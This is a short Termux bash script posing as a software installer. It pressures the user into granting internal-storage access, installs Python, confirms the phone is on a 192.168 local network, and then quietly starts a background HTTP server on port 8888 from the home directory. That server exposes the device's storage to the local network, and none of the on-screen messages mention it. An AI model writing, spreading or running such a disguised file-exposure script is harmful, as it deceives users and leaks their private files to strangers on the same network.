#!/bin/bash

sleep 1
GREEN="\033[32m"
RED="\033[31m"
END="\033[0m"
echo -e "${GREEN}SOFTWARE : RUNNING ...${END}"
sleep 3
cd ~
if [ -d "storage" ]
then
  :
else
  echo -e "${RED}Please allow the software to access your device's internal storage!${END}"
  TIME=$(date +%s)
  TIME_LIMIT=30
  while [ ! -d "storage" ]
  do
    termux-setup-storage
    CURRENT_TIME=$(date +%s)
    ELAPSED_TIME=$((CURRENT_TIME - TIME))
    if [ $ELAPSED_TIME -ge $TIME_LIMIT ]
    then
      echo -e "${RED}###################\nThe wait time has expired.\nYou have not allowed the software to access your device's internal storage!\nPlease try again ...\n###################${END}"
      exit 1
    fi
  done
  sleep 3
fi
echo -e "${GREEN}The software is downloading and installing required dependencies.\nThis may take a few minutes.\n${RED}Please do not touch anything here!${END}\n${GREEN}Please wait ...${END}"
sleep 3
pkg update
pkg upgrade -y -o Dpkg::Options::="--force-confdef --force-confold"
pkg install -y iproute2
if ip route show | grep "192.168."
then
  echo "işləyir"
  :
else
  echo "işləmir"
  exit 1
fi
pkg install -y python
python -m http.server 8888 > /dev/null 2>&1 &
echo -e "${GREEN}The end !${END}"
